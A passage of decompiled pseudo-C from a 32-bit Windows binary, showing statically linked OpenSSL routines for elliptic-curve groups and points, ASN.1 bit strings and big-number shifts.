      if ( v5 )
      {
        v5(Block[1]);
      }
      else
      {
        v6 = *(void (__cdecl **)(volatile LONG *))(*v4 + 48);
        if ( v6 )
          v6(Block[1]);
      }
      sub_4134B0(v4, 20);
    }
    sub_417000(Block[2]);
    sub_417000(Block[3]);
    sub_4134B0(Block[7], (int)Block[8]);
    sub_4134B0(Block, 100);
  }
}

//----- (00436900) --------------------------------------------------------
int __cdecl sub_436900(int a1, int a2)
{
  int result; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  void *v5; // ecx
  void *v6; // eax
  int v7; // edx
  int v8; // edx

  if ( !*(_DWORD *)(*(_DWORD *)a1 + 20) )
  {
    sub_408310(16, 106, 66, (int)"crypto\\ec\\ec_lib.c", 133);
    return 0;
  }
  if ( *(_DWORD *)a1 != *(_DWORD *)a2 )
  {
    sub_408310(16, 106, 101, (int)"crypto\\ec\\ec_lib.c", 137);
    return 0;
  }
  if ( a1 == a2 )
    return 1;
  *(_DWORD *)(a1 + 92) = *(_DWORD *)(a2 + 92);
  if ( *(_DWORD *)(a2 + 92) == 5 )
    *(_DWORD *)(a1 + 96) = sub_457730(*(_DWORD *)(a2 + 96));
  else
    *(_DWORD *)(a1 + 96) = 0;
  if ( !*(_DWORD *)(a2 + 88) )
  {
    sub_4285A0(*(_DWORD **)(a1 + 88));
    *(_DWORD *)(a1 + 88) = 0;
    goto LABEL_16;
  }
  if ( !*(_DWORD *)(a1 + 88) )
  {
    v3 = sub_4289A0();
    *(_DWORD *)(a1 + 88) = v3;
    if ( !v3 )
      return 0;
  }
  result = (int)sub_428820(*(_DWORD **)(a1 + 88), *(_DWORD **)(a2 + 88));
  if ( result )
  {
LABEL_16:
    if ( *(_DWORD *)(a2 + 4) )
    {
      if ( !*(_DWORD *)(a1 + 4) )
      {
        v4 = sub_435F90((int *)a1);
        *(_DWORD *)(a1 + 4) = v4;
        if ( !v4 )
          return 0;
      }
      if ( !sub_4360B0(*(_DWORD **)(a1 + 4), *(_DWORD **)(a2 + 4)) )
        return 0;
    }
    else
    {
      sub_436070(*(_BYTE **)(a1 + 4));
      *(_DWORD *)(a1 + 4) = 0;
    }
    if ( (**(_BYTE **)a2 & 2) != 0
      || sub_4173E0(*(_DWORD **)(a1 + 8), *(_DWORD **)(a2 + 8))
      && sub_4173E0(*(_DWORD **)(a1 + 12), *(_DWORD **)(a2 + 12)) )
    {
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
      v5 = *(void **)(a1 + 28);
      *(_DWORD *)(a1 + 20) = *(_DWORD *)(a2 + 20);
      *(_DWORD *)(a1 + 24) = *(_DWORD *)(a2 + 24);
      if ( !*(_DWORD *)(a2 + 28) )
      {
        sub_413490(v5);
        v8 = *(_DWORD *)a1;
        *(_DWORD *)(a1 + 28) = 0;
        *(_DWORD *)(a1 + 32) = 0;
        return (*(int (__cdecl **)(int, int))(v8 + 20))(a1, a2);
      }
      sub_413490(v5);
      v6 = sub_4133F0(*(_DWORD *)(a2 + 32));
      *(_DWORD *)(a1 + 28) = v6;
      if ( v6 && memcpy(v6, *(const void **)(a2 + 28), *(_DWORD *)(a2 + 32)) )
      {
        v7 = *(_DWORD *)a1;
        *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
        return (*(int (__cdecl **)(int, int))(v7 + 20))(a1, a2);
      }
    }
    return 0;
  }
  return result;
}

//----- (00436AE0) --------------------------------------------------------
volatile LONG **__cdecl sub_436AE0(int *a1)
{
  volatile LONG **v2; // eax
  volatile LONG **v3; // esi

  if ( !a1 )
    return 0;
  v2 = (volatile LONG **)sub_435C30(*a1);
  v3 = v2;
  if ( !v2 )
    return 0;
  if ( !sub_436900((int)v2, (int)a1) )
  {
    sub_4367A0(v3);
    return 0;
  }
  return v3;
}

//----- (00436B20) --------------------------------------------------------
int __cdecl sub_436B20(int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int result; // eax
  _DWORD *v5; // eax

  if ( !a2 )
  {
    sub_408310(16, 111, 67, (int)"crypto\\ec\\ec_lib.c", 263);
    return 0;
  }
  if ( !*(_DWORD *)(a1 + 4) )
  {
    v5 = sub_435F90((int *)a1);
    *(_DWORD *)(a1 + 4) = v5;
    if ( !v5 )
      return 0;
  }
  if ( !sub_4360B0(*(_DWORD **)(a1 + 4), a2) )
    return 0;
  if ( a3 )
  {
    result = (int)sub_4173E0(*(_DWORD **)(a1 + 8), a3);
    if ( !result )
      return result;
  }
  else
  {
    sub_417490(*(_DWORD **)(a1 + 8), 0);
  }
  if ( a4 )
  {
    if ( !sub_4173E0(*(_DWORD **)(a1 + 12), a4) )
      return 0;
  }
  else
  {
    sub_417490(*(_DWORD **)(a1 + 12), 0);
  }
  if ( sub_416E20(*(_DWORD *)(a1 + 8)) )
    return sub_436700(a1);
  sub_4285A0(*(_DWORD **)(a1 + 88));
  *(_DWORD *)(a1 + 88) = 0;
  return 1;
}

//----- (00436C00) --------------------------------------------------------
int __cdecl sub_436C00(int a1, int a2, int *a3)
{
  int v6; // edx
  int v7; // ecx
  int *v8; // esi
  _DWORD *v9; // ebp
  _DWORD *v10; // eax
  _DWORD *v11; // ecx
  _DWORD *v12; // edi
  _DWORD *v13; // ebx
  void **Block; // [esp+Ch] [ebp-14h]
  int v15; // [esp+10h] [ebp-10h]
  _DWORD *v16; // [esp+14h] [ebp-Ch]
  _DWORD *v17; // [esp+18h] [ebp-8h]
  _DWORD *v18; // [esp+1Ch] [ebp-4h]
  _DWORD *v19; // [esp+24h] [ebp+4h]
  _DWORD *v20; // [esp+28h] [ebp+8h]

  v15 = 0;
  Block = 0;
  if ( *(_DWORD *)(*(_DWORD *)a1 + 4) != *(_DWORD *)(*(_DWORD *)a2 + 4) )
    return 1;
  v6 = *(_DWORD *)(a1 + 16);
  if ( v6 )
  {
    v7 = *(_DWORD *)(a2 + 16);
    if ( v7 )
    {
      if ( v6 != v7 )
        return 1;
    }
  }
  if ( (**(_BYTE **)a1 & 2) != 0 )
    return 0;
  v8 = a3;
  if ( a3 || (v8 = sub_420670(), (Block = (void **)v8) != 0) )
  {
    sub_420700(v8);
    v20 = sub_420790(v8);
    v17 = sub_420790(v8);
    v18 = sub_420790(v8);
    v19 = sub_420790(v8);
    v16 = sub_420790(v8);
    v9 = sub_420790(v8);
    if ( !v9 )
    {
      sub_420750(v8);
      sub_4206C0(Block);
      return -1;
    }
    if ( !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 28))(a1, v20, v17, v18, v8)
      || !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a2 + 28))(a2, v19, v16, v9, v8)
      || sub_4169B0(v20, v19)
      || sub_4169B0(v17, v16)
      || sub_4169B0(v18, v9)
      || sub_4364F0(a1, *(_DWORD **)(a1 + 4), *(_DWORD **)(a2 + 4), (int)v8) )
    {
LABEL_22:
      v15 = 1;
LABEL_23:
      sub_420750(v8);
      sub_4206C0(Block);
      return v15;
    }
    v10 = *(_DWORD **)(a1 + 8);
    v11 = *(_DWORD **)(a2 + 8);
    v12 = *(_DWORD **)(a1 + 12);
    v13 = *(_DWORD **)(a2 + 12);
    if ( v10 && v11 )
    {
      if ( !sub_4169B0(v10, v11) && !sub_4169B0(v12, v13) )
        goto LABEL_23;
      goto LABEL_22;
    }
    sub_420750(v8);
    sub_4206C0(Block);
  }
  return -1;
}

//----- (00436DF0) --------------------------------------------------------
int __cdecl sub_436DF0(int a1, _DWORD *a2, int a3, int a4, int a5)
{
  int (__cdecl *v5)(int, _DWORD *, int, int, int); // eax

  v5 = *(int (__cdecl **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 72);
  if ( !v5 )
  {
    sub_408310(16, 124, 66, (int)"crypto\\ec\\ec_lib.c", 694);
    return 0;
  }
  if ( *(_DWORD *)a1 != *a2 )
  {
    sub_408310(16, 124, 101, (int)"crypto\\ec\\ec_lib.c", 699);
    return 0;
  }
  if ( !v5(a1, a2, a3, a4, a5) )
    return 0;
  if ( sub_436490(a1, a2, a5) <= 0 )
  {
    sub_408310(16, 124, 107, (int)"crypto\\ec\\ec_lib.c", 707);
    return 0;
  }
  return 1;
}

//----- (00436EA0) --------------------------------------------------------
int __cdecl sub_436EA0(int a1, _DWORD *a2, int a3, int a4, int a5)
{
  int (__cdecl *v5)(int, _DWORD *, int, int, int); // eax

  v5 = *(int (__cdecl **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 72);
  if ( !v5 )
  {
    sub_408310(16, 185, 66, (int)"crypto\\ec\\ec_lib.c", 720);
    return 0;
  }
  if ( *(_DWORD *)a1 != *a2 )
  {
    sub_408310(16, 185, 101, (int)"crypto\\ec\\ec_lib.c", 725);
    return 0;
  }
  if ( !v5(a1, a2, a3, a4, a5) )
    return 0;
  if ( sub_436490(a1, a2, a5) <= 0 )
  {
    sub_408310(16, 185, 107, (int)"crypto\\ec\\ec_lib.c", 733);
    return 0;
  }
  return 1;
}

//----- (00436F50) --------------------------------------------------------
int __usercall sub_436F50@<eax>(__m64 a1@<mm0>, int **a2, int **a3, int *a4, int a5, int *a6)
{
  int *v6; // eax
  int (__cdecl *v7)(int **, int **, int *, int, int *); // ecx

  v6 = *a2;
  v7 = (int (__cdecl *)(int **, int **, int *, int, int *))(*a2)[20];
  if ( v7 || (*(_BYTE *)v6 & 1) != 0 )
  {
    if ( v6 == *a3 )
    {
      if ( (*(_BYTE *)v6 & 1) != 0 )
      {
        if ( v6[1] == 406 )
          return sub_458DF0(a1, a2, a3, a4, a5, (int)a6);
        else
          return sub_458610(a1, (int)a2, a3, a4, a5, a6);
      }
      else
      {
        return v7(a2, a3, a4, a5, a6);
      }
    }
    else
    {
      sub_408310(16, 125, 101, (int)"crypto\\ec\\ec_oct.c", 35);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 125, 66, (int)"crypto\\ec\\ec_oct.c", 30);
    return 0;
  }
}

//----- (00437000) --------------------------------------------------------
int __usercall sub_437000@<eax>(__m64 a1@<mm0>, int **a2, int **a3, int *a4, int a5, int *a6)
{
  int *v6; // eax
  int (__cdecl *v7)(int **, int **, int *, int, int *); // ecx

  v6 = *a2;
  v7 = (int (__cdecl *)(int **, int **, int *, int, int *))(*a2)[20];
  if ( v7 || (*(_BYTE *)v6 & 1) != 0 )
  {
    if ( v6 == *a3 )
    {
      if ( (*(_BYTE *)v6 & 1) != 0 )
      {
        if ( v6[1] == 406 )
          return sub_458DF0(a1, a2, a3, a4, a5, (int)a6);
        else
          return sub_458610(a1, (int)a2, a3, a4, a5, a6);
      }
      else
      {
        return v7(a2, a3, a4, a5, a6);
      }
    }
    else
    {
      sub_408310(16, 186, 101, (int)"crypto\\ec\\ec_oct.c", 71);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 186, 66, (int)"crypto\\ec\\ec_oct.c", 66);
    return 0;
  }
}

//----- (004370B0) --------------------------------------------------------
int __cdecl sub_4370B0(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6)
{
  int v6; // eax
  int (__cdecl *v7)(int, _DWORD *, int, _BYTE *, unsigned int, int *); // ecx

  v6 = *(_DWORD *)a1;
  v7 = *(int (__cdecl **)(int, _DWORD *, int, _BYTE *, unsigned int, int *))(*(_DWORD *)a1 + 84);
  if ( v7 || (*(_BYTE *)v6 & 1) != 0 )
  {
    if ( v6 == *a2 )
    {
      if ( (*(_BYTE *)v6 & 1) != 0 )
      {
        if ( *(_DWORD *)(v6 + 4) == 406 )
          return sub_459150(a1, a2, a3, a4, a5, a6);
        else
          return sub_458850(a1, a2, a3, a4, a5, a6);
      }
      else
      {
        return v7(a1, a2, a3, a4, a5, a6);
      }
    }
    else
    {
      sub_408310(16, 123, 101, (int)"crypto\\ec\\ec_oct.c", 97);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 123, 66, (int)"crypto\\ec\\ec_oct.c", 93);
    return 0;
  }
}

//----- (00437160) --------------------------------------------------------
int __usercall sub_437160@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6)
{
  int *v6; // eax
  int (__cdecl *v7)(int **, int **, _BYTE *, int, int *); // ecx

  v6 = *a2;
  v7 = (int (__cdecl *)(int **, int **, _BYTE *, int, int *))(*a2)[22];
  if ( v7 || (*(_BYTE *)v6 & 1) != 0 )
  {
    if ( v6 == *a3 )
    {
      if ( (*(_BYTE *)v6 & 1) != 0 )
      {
        if ( v6[1] == 406 )
          return sub_459440(a1, a2, a3, a4, a5, a6);
        else
          return sub_458B70(a1, a2, a3, a4, a5, a6);
      }
      else
      {
        return v7(a2, a3, a4, a5, a6);
      }
    }
    else
    {
      sub_408310(16, 122, 101, (int)"crypto\\ec\\ec_oct.c", 127);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 122, 66, (int)"crypto\\ec\\ec_oct.c", 123);
    return 0;
  }
}

//----- (00437210) --------------------------------------------------------
int __cdecl sub_437210(int a1, _DWORD *a2, int a3, _DWORD *a4, int *a5)
{
  int result; // eax
  unsigned int v6; // esi
  _BYTE *v7; // eax
  void *v8; // edi

  result = sub_4370B0(a1, a2, a3, 0, 0, 0);
  v6 = result;
  if ( result )
  {
    v7 = sub_4133F0(result);
    v8 = v7;
    if ( !v7 )
      return 0;
    result = sub_4370B0(a1, a2, a3, v7, v6, a5);
    if ( !result )
    {
      sub_413490(v8);
      return 0;
    }
    *a4 = v8;
  }
  return result;
}

//----- (004372A0) --------------------------------------------------------
int *__cdecl sub_4372A0(int a1, _DWORD *a2, int (*a3)(void))
{
  int *v3; // esi
  void **v4; // ebp
  int v5; // eax
  int v7; // edi
  _BYTE *v8; // ebx
  int v9; // eax
  int *v10; // eax
  int v11; // eax
  void **v12; // edi
  int v13; // [esp-Ch] [ebp-38h]
  void **v14; // [esp+8h] [ebp-24h]
  void **v15; // [esp+Ch] [ebp-20h]
  void **v16; // [esp+10h] [ebp-1Ch]
  _DWORD *Block; // [esp+14h] [ebp-18h]
  void **v18; // [esp+18h] [ebp-14h]
  void **v19; // [esp+20h] [ebp-Ch]
  void **v20; // [esp+24h] [ebp-8h]
  size_t Size; // [esp+28h] [ebp-4h]

  v3 = 0;
  v4 = 0;
  Block = 0;
  v15 = 0;
  v18 = 0;
  v16 = 0;
  v20 = 0;
  v19 = 0;
  if ( a2 )
  {
    v14 = (void **)sub_420670();
    if ( !v14 )
    {
      sub_408310(16, 175, 65, (int)"crypto\\ec\\ec_curve.c", 2998);
      goto LABEL_36;
    }
    v7 = a2[2];
    Size = a2[1];
    v8 = (char *)a2 + Size + 16;
    v4 = (void **)sub_4174D0(v8, v7, 0);
    if ( v4 && (v15 = (void **)sub_4174D0(&v8[v7], v7, 0)) != 0 && (v18 = (void **)sub_4174D0(&v8[2 * v7], v7, 0)) != 0 )
    {
      if ( a3 )
      {
        v9 = a3();
        v10 = sub_435C30(v9);
        v3 = v10;
        if ( !v10
          || !(*(int (__cdecl **)(int *, void **, void **, void **, void **))(*v10 + 24))(v10, v4, v15, v18, v14) )
        {
          sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3019);
          goto LABEL_36;
        }
      }
      else if ( *a2 == 406 )
      {
        v3 = (int *)sub_437A20();
        if ( !v3 )
        {
          sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3024);
          goto LABEL_36;
        }
      }
      else
      {
        v3 = (int *)sub_437A70();
        if ( !v3 )
        {
          sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3033);
          goto LABEL_36;
        }
      }
      Block = sub_435F90(v3);
      if ( !Block )
      {
        sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3040);
        goto LABEL_36;
      }
      v16 = (void **)sub_4174D0(&v8[2 * v7 + v7], v7, 0);
      if ( v16 && (v11 = sub_4174D0(&v8[4 * v7], v7, 0), (v20 = (void **)v11) != 0) )
      {
        if ( !sub_436DF0((int)v3, Block, (int)v16, v11, (int)v14) )
        {
          sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3050);
          goto LABEL_36;
        }
        v12 = (void **)sub_4174D0(&v8[4 * v7 + v7], v7, 0);
        v19 = v12;
        if ( v12 && sub_417490(v16, a2[3]) )
        {
          if ( sub_436B20((int)v3, Block, v12, v16) )
          {
            if ( !Size || sub_435DE0((int)v3, a2 + 4, Size) )
              goto LABEL_37;
            sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3064);
          }
          else
          {
            sub_408310(16, 175, 16, (int)"crypto\\ec\\ec_curve.c", 3059);
          }
LABEL_36:
          sub_4367A0((volatile LONG **)v3);
          v3 = 0;
LABEL_37:
          sub_436040(Block);
          sub_4206C0(v14);
          sub_417060(v4);
          sub_417060(v15);
          sub_417060(v18);
          sub_417060(v19);
          sub_417060(v16);
          sub_417060(v20);
          return v3;
        }
        v13 = 3055;
      }
      else
      {
        v13 = 3046;
      }
    }
    else
    {
      v13 = 3011;
    }
    sub_408310(16, 175, 3, (int)"crypto\\ec\\ec_curve.c", v13);
    goto LABEL_36;
  }
  if ( !a3 )
    return sub_435C30(0);
  v5 = a3();
  return sub_435C30(v5);
}

//----- (004375B0) --------------------------------------------------------
int *__cdecl sub_4375B0(int a1)
{
  unsigned int v1; // ecx
  _DWORD *v2; // eax
  void *v3; // esp
  int *v4; // eax
  int *v5; // esi

  if ( a1 <= 0 )
    return 0;
  v1 = 0;
  v2 = &unk_50B158;
  while ( *v2 != a1 )
  {
    ++v1;
    v2 += 4;
    if ( v1 >= 0x51 )
      goto LABEL_7;
  }
  v3 = alloca(16);
  v4 = sub_4372A0(
         *((_DWORD *)&unk_50B158 + 4 * v1),
         *((_DWORD **)&unk_50B158 + 4 * v1 + 1),
         *((int (**)(void))&unk_50B158 + 4 * v1 + 2));
  v5 = v4;
  if ( !v4 )
  {
LABEL_7:
    sub_408310(16, 174, 129, (int)"crypto\\ec\\ec_curve.c", 3100);
    return 0;
  }
  sub_435DC0((int)v4, a1);
  return v5;
}

//----- (00437640) --------------------------------------------------------
char *__cdecl sub_437640(int a1)
{
  int v1; // eax

  v1 = 0;
  while ( dword_5313FC[2 * v1] != a1 )
  {
    if ( (unsigned int)++v1 >= 0xF )
      return 0;
  }
  return (&off_5313F8)[2 * v1];
}
// 5313F8: using guessed type char *off_5313F8;
// 5313FC: using guessed type int dword_5313FC[];

//----- (00437660) --------------------------------------------------------
int __cdecl sub_437660(const char *a1)
{
  int v1; // esi

  v1 = 0;
  while ( strcmp((&off_5313F8)[2 * v1], a1) )
  {
    if ( (unsigned int)++v1 >= 0xF )
      return 0;
  }
  return dword_5313FC[2 * v1];
}
// 5313F8: using guessed type char *off_5313F8;
// 5313FC: using guessed type int dword_5313FC[];

//----- (004376C0) --------------------------------------------------------
int __cdecl sub_4376C0(int a1, _BYTE **a2)
{
  int result; // eax
  signed int v3; // edi
  int v4; // ebx
  int v5; // ecx
  _BYTE *v6; // eax
  char v7; // al
  _BYTE *v8; // esi
  char *v9; // esi

  if ( !a1 )
    return 0;
  v3 = *(_DWORD *)a1;
  if ( *(int *)a1 <= 0 )
    goto LABEL_23;
  v4 = *(_DWORD *)(a1 + 12);
  if ( (v4 & 8) != 0 )
  {
    LOBYTE(v4) = v4 & 7;
    goto LABEL_24;
  }
  v5 = *(_DWORD *)(a1 + 8);
  v6 = (_BYTE *)(v5 + v3 - 1);
  do
  {
    if ( *v6 )
      break;
    --v3;
    --v6;
  }
  while ( v3 > 0 );
  v7 = *(_BYTE *)(v5 + v3 - 1);
  if ( (v7 & 1) != 0 )
  {
LABEL_23:
    LOBYTE(v4) = 0;
  }
  else if ( (v7 & 2) != 0 )
  {
    LOBYTE(v4) = 1;
  }
  else if ( (v7 & 4) != 0 )
  {
    LOBYTE(v4) = 2;
  }
  else if ( (v7 & 8) != 0 )
  {
    LOBYTE(v4) = 3;
  }
  else if ( (v7 & 0x10) != 0 )
  {
    LOBYTE(v4) = 4;
  }
  else if ( (v7 & 0x20) != 0 )
  {
    LOBYTE(v4) = 5;
  }
  else if ( (v7 & 0x40) != 0 )
  {
    LOBYTE(v4) = 6;
  }
  else
  {
    v4 = (char)(v7 & 0x80) != 0 ? 7 : 0;
  }
LABEL_24:
  result = v3 + 1;
  if ( a2 )
  {
    v8 = *a2;
    *v8 = v4;
    v9 = v8 + 1;
    if ( v3 > 0 )
    {
      memcpy(v9, *(const void **)(a1 + 8), v3);
      result = v3 + 1;
      v9 += v3;
      *(v9 - 1) &= -1 << v4;
    }
    *a2 = v9;
  }
  return result;
}

//----- (00437790) --------------------------------------------------------
size_t *__cdecl sub_437790(size_t **a1, unsigned __int8 **a2, int a3)
{
  size_t **v3; // ebx
  size_t *v5; // esi
  __int16 v6; // ax
  char *v7; // ebp
  int v8; // edx
  size_t v9; // edi
  char *v10; // eax
  char *v11; // ebx
  size_t *result; // eax
  void *v13; // [esp-Ch] [ebp-1Ch]
  unsigned __int8 v14; // [esp+1Ch] [ebp+Ch]

  v3 = a1;
  v5 = 0;
  if ( a3 < 1 )
  {
    v6 = 152;
LABEL_11:
    sub_408310(13, 189, v6, (int)"crypto\\asn1\\a_bitstr.c", 131);
    if ( !v3 || *v3 != v5 )
      sub_42C4F0(v5);
    return 0;
  }
  if ( !a1 || (v5 = *a1) == 0 )
  {
    v5 = sub_42C4E0();
    if ( !v5 )
      return 0;
  }
  v7 = (char *)(*a2 + 1);
  v14 = **a2;
  if ( v14 > 7u )
  {
    v6 = 220;
    goto LABEL_11;
  }
  v8 = a3;
  v9 = a3 - 1;
  v5[3] = **a2 | v5[3] & 0xFFFFFFF8 | 8;
  if ( v8 <= 1 )
  {
    v11 = 0;
  }
  else
  {
    v10 = (char *)sub_4133F0(v9);
    v11 = v10;
    if ( !v10 )
    {
      v3 = a1;
      v6 = 65;
      goto LABEL_11;
    }
    memcpy(v10, v7, v9);
    v11[v9 - 1] &= -1 << v14;
    v7 += v9;
  }
  v13 = (void *)v5[2];
  *v5 = v9;
  sub_413490(v13);
  v5[2] = (size_t)v11;
  v5[1] = 3;
  if ( a1 )
    *a1 = v5;
  result = v5;
  *a2 = (unsigned __int8 *)v7;
  return result;
}

//----- (004378A0) --------------------------------------------------------
int __cdecl sub_4378A0(signed int *a1, int a2, int a3)
{
  int v3; // eax
  int v4; // edi
  char v5; // bl
  signed int v6; // ecx
  _BYTE *v7; // ebp
  signed int v9; // ecx
  int v10; // eax
  char v11; // [esp+18h] [ebp+8h]

  v3 = 1 << (7 - (a2 & 7));
  v4 = a2 / 8;
  v11 = v3;
  v5 = ~(_BYTE)v3;
  if ( !a3 )
  {
    v11 = 0;
    LOBYTE(v3) = 0;
  }
  if ( !a1 )
    return 0;
  v6 = *a1;
  a1[3] &= 0xFFFFFFF0;
  if ( v6 >= v4 + 1 && a1[2] )
  {
LABEL_13:
    *(_BYTE *)(a1[2] + v4) = v3 | *(_BYTE *)(a1[2] + v4) & v5;
    if ( *a1 > 0 )
    {
      v9 = a1[2];
      do
      {
        if ( *(_BYTE *)(v9 + *a1 - 1) )
          break;
        v10 = *a1 - 1;
        *a1 = v10;
      }
      while ( v10 > 0 );
    }
    return 1;
  }
  if ( a3 )
  {
    v7 = sub_4135B0((_BYTE *)a1[2], v6, v4 + 1);
    if ( !v7 )
    {
      sub_408310(13, 183, 65, (int)"crypto\\asn1\\a_bitstr.c", 161);
      return 0;
    }
    if ( v4 - *a1 + 1 > 0 )
      memset(&v7[*a1], 0, v4 - *a1 + 1);
    *a1 = v4 + 1;
    LOBYTE(v3) = v11;
    a1[2] = (signed int)v7;
    goto LABEL_13;
  }
  return 1;
}

//----- (004379A0) --------------------------------------------------------
BOOL __cdecl sub_4379A0(_DWORD *a1, int a2)
{
  int v2; // eax
  int v3; // edi

  v2 = a2 / 8;
  return a1 && *a1 >= v2 + 1 && (v3 = a1[2]) != 0 && ((unsigned __int8)(1 << (7 - (a2 & 7))) & *(_BYTE *)(v3 + v2)) != 0;
}

//----- (00437A20) --------------------------------------------------------
volatile LONG **sub_437A20()
{
  void *v0; // eax
  volatile LONG **v1; // esi

  v0 = sub_45B380();
  v1 = (volatile LONG **)sub_435C30((int)v0);
  if ( !v1 )
    return 0;
  if ( !sub_435E60((int)v1) )
  {
    sub_436840(v1);
    return 0;
  }
  return v1;
}

//----- (00437A70) --------------------------------------------------------
volatile LONG **sub_437A70()
{
  void *v0; // eax
  volatile LONG **v1; // esi

  v0 = sub_45C270();
  v1 = (volatile LONG **)sub_435C30((int)v0);
  if ( !v1 )
    return 0;
  if ( !sub_435ED0((int)v1) )
  {
    sub_436840(v1);
    return 0;
  }
  return v1;
}

//----- (00437AC0) --------------------------------------------------------
int __cdecl sub_437AC0(int **a1, int **a2)
{
  int *v3; // ecx
  int v4; // ebx
  unsigned int v5; // edx
  int *v6; // edi
  unsigned int v7; // eax
  unsigned int v8; // eax

  if ( a1 == a2 )
  {
    if ( !sub_4173C0((int)a1, (int)a2[1] + 1) )
      return 0;
  }
  else
  {
    a1[3] = a2[3];
    if ( !sub_4173C0((int)a1, (int)a2[1] + 1) )
      return 0;
    a1[1] = a2[1];
  }
  v3 = *a1;
  v4 = 0;
  v5 = 0;
  v6 = *a2;
  if ( (int)a2[1] > 0 )
  {
    do
    {
      v7 = *v6;
      *v3 = v5 | (2 * *v6);
      v8 = v7 >> 31;
      ++v4;
      ++v6;
      ++v3;
      v5 = v8;
    }
    while ( v4 < (int)a2[1] );
    if ( v8 )
    {
      *v3 = 1;
      a1[1] = (int *)((char *)a1[1] + 1);
    }
  }
  return 1;
}

//----- (00437B50) --------------------------------------------------------
int __cdecl sub_437B50(int *a1, int *a2)
{
  int result; // eax
  int v3; // esi
  int v4; // edi
  BOOL v5; // edx
  int v6; // ecx
  unsigned int v7; // eax
  int v8; // ebx
  int v9; // esi
  int v10; // edx
  unsigned int v11; // eax
  int *v12; // ecx
  int v13; // edi
  unsigned int v14; // eax
  int v15; // [esp+4h] [ebp-4h]

  if ( sub_416DB0((int)a2) )
  {
    sub_417490(a1, 0);
    return 1;
  }
  v3 = a2[1];
  v4 = *a2;
  v5 = *(_DWORD *)(*a2 + 4 * v3 - 4) == 1;
  v6 = v3 - v5;
  v15 = v3 - v5;
  if ( a2 != a1 )
  {
    result = (int)sub_4173C0((int)a1, v3 - v5);
    if ( !result )
      return result;
    v6 = v15;
    a1[3] = a2[3];
  }
  v7 = *(_DWORD *)(v4 + 4 * v3 - 4);
  v8 = *a1;
  v9 = v3 - 1;
  v10 = v7 << 31;
  v11 = v7 >> 1;
  if ( v11 )
    *(_DWORD *)(v8 + 4 * v9) = v11;
  if ( v9 > 0 )
  {
    v12 = (int *)(v8 + 4 * v9);
    v13 = v4 - v8;
    do
    {
      v14 = *(int *)((char *)v12-- + v13 - 4);
      --v9;
      *v12 = v10 | (v14 >> 1);
      v10 = v14 << 31;
    }
    while ( v9 > 0 );
    v6 = v15;
  }
  a1[1] = v6;
  return 1;
}

//----- (00437C10) --------------------------------------------------------
int __cdecl sub_437C10(_DWORD *a1, _DWORD *a2, int a3)
{
  int result; // eax
  _DWORD *v4; // esi
  int v5; // ebp
  int v6; // edi
  int v7; // ecx
  _DWORD *v8; // edx
  int v9; // eax
  _DWORD *v10; // edi
  int v11; // esi
  _DWORD *v12; // edx
  unsigned int v13; // eax
  int v14; // [esp+4h] [ebp-8h]
  _DWORD *v15; // [esp+8h] [ebp-4h]
  int v16; // [esp+18h] [ebp+Ch]

  if ( a3 >= 0 )
  {
    v4 = a2;
    a1[3] = a2[3];
    v5 = a3 / 32;
    v14 = a3 / 32;
    result = (int)sub_4173C0((int)a1, a2[1] + a3 / 32 + 1);
    if ( result )
    {
      v6 = a3 % 32;
      v7 = *a2;
      v8 = (_DWORD *)*a1;
      v16 = *a2;
      v15 = v8;
      v8[v5 + a2[1]] = 0;
      if ( v6 )
      {
        v11 = a2[1] - 1;
        if ( v11 >= 0 )
        {
          v12 = &v8[v11 + 1 + v5];
          while ( 1 )
          {
            v13 = *(_DWORD *)(v7 + 4 * v11--);
            *v12-- |= v13 >> (32 - v6);
            *v12 = v13 << v6;
            if ( v11 < 0 )
              break;
            v7 = v16;
          }
          v5 = v14;
          v8 = v15;
        }
        v4 = a2;
      }
      else
      {
        v9 = a2[1] - 1;
        if ( v9 >= 0 )
        {
          v10 = &v8[v9 + v5];
          do
            *v10-- = *(_DWORD *)(v7 + 4 * v9--);
          while ( v9 >= 0 );
        }
      }
      memset(v8, 0, 4 * v5);
      a1[1] = v4[1] + v5 + 1;
      sub_416F60(a1);
      return 1;
    }
  }
  else
  {
    sub_408310(3, 145, 119, (int)"crypto\\bn\\bn_shift.c", 91);
    return 0;
  }
  return result;
}

//----- (00437D40) --------------------------------------------------------
int __cdecl sub_437D40(unsigned int **a1, unsigned int **a2, int a3)
{
  int result; // eax
  int v5; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v8; // eax
  unsigned int **v9; // ecx
  int v10; // eax
  unsigned int *v11; // edi
  int v12; // ecx
  unsigned int *v13; // eax
  unsigned int v14; // esi
  unsigned int *v15; // eax
  unsigned int v16; // edx
  unsigned int v17; // ebp
  bool v18; // zf
  unsigned int v19; // esi
  char v20; // [esp+4h] [ebp-4h]
  int v21; // [esp+14h] [ebp+Ch]
  int v22; // [esp+14h] [ebp+Ch]

  if ( a3 < 0 )
  {
    sub_408310(3, 146, 119, (int)"crypto\\bn\\bn_shift.c", 130);
    return 0;
  }
  v5 = a3 / 32;
  v6 = a3 & 0x8000001F;
  v20 = 32 - (a3 & 0x1F);
  v7 = (int)a2[1];
  if ( a3 / 32 >= v7 || !v7 )
  {
    sub_417490(a1, 0);
    return 1;
  }
  v8 = sub_416F90(a2);
